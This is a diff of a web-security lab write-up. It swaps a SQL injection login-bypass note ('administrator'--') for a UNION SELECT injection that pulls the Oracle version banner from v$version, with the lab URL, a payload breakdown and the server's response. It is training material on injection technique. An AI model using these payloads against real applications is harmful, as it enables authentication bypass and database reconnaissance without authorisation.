@@ -1,39 +1,43 @@
-## Lab 02: SQL Injection — Login Bypass
- 
-**Technique:** Comment Truncation
+**Technique:** UNION SELECT
+**Database:** Oracle 11g
 **Status:** Solved
  
 ### Context
  
-The login form passes the submitted username and password into a SQL query that checks both values. Because the username field is injected directly without sanitisation, it is possible to close the username string early and comment out the password check entirely.
+The category filter is vulnerable to UNION injection. Oracle databases expose version information through a special view called `v$version` which stores one row per installed component. The task is to extract that information by appending a second SELECT via UNION.
  
-### Final Payload (username field)
+### Final Payload
  
 ```
-administrator'--
+' UNION SELECT BANNER, NULL FROM v$version--
 ```
  
-### What Happens Inside the Query
- 
-```sql
--- Original query structure:
-SELECT * FROM users WHERE username = '...' AND password = '...'
- 
--- After injection:
-SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'
+**Full URL:**
+```
+https://0a7d00ac04636584800a173a00740040.web-security-academy.net/filter?category=%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--
 ```
  
 ### Payload Breakdown
  
 | Token | Purpose |
 |---|---|
-| `administrator` | Valid username, the query will match this specific account |
-| `'` | Closes the opening string quote the application placed before the username value |
-| `--` | SQL comment, renders the `AND password = ...` clause invisible to the database, no password check is performed |
+| `'` | Closes the original string literal |
+| `UNION SELECT` | Appends a second result set to the original query, the injected SELECT must have the same number of columns as the original |
+| `BANNER` | The column in `v$version` that holds the version string for each database component |
+| `NULL` | The original query returns two columns, the second injected column must exist to match the column count but no data is needed from it, NULL is used as a placeholder and avoids data type conflicts since it is compatible with any column type |
+| `FROM v$version` | Oracle-specific system view holding version info for each installed component, this view does not exist in MySQL or PostgreSQL making it a reliable Oracle fingerprint |
+| `--` | Comments out the rest of the original query |
  
-### Result
+### Response Received
  
-Authenticated directly as administrator. Lab solved.
+```
+CORE 11.2.0.2.0 Production
+NLSRTL Version 11.2.0.2.0 - Production
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+PL/SQL Release 11.2.0.2.0 - Production
+TNS for Linux: Version 11.2.0.2.0 - Production
+```
+ 
+Confirmed Oracle 11g. Lab solved.
  
 ---
- 
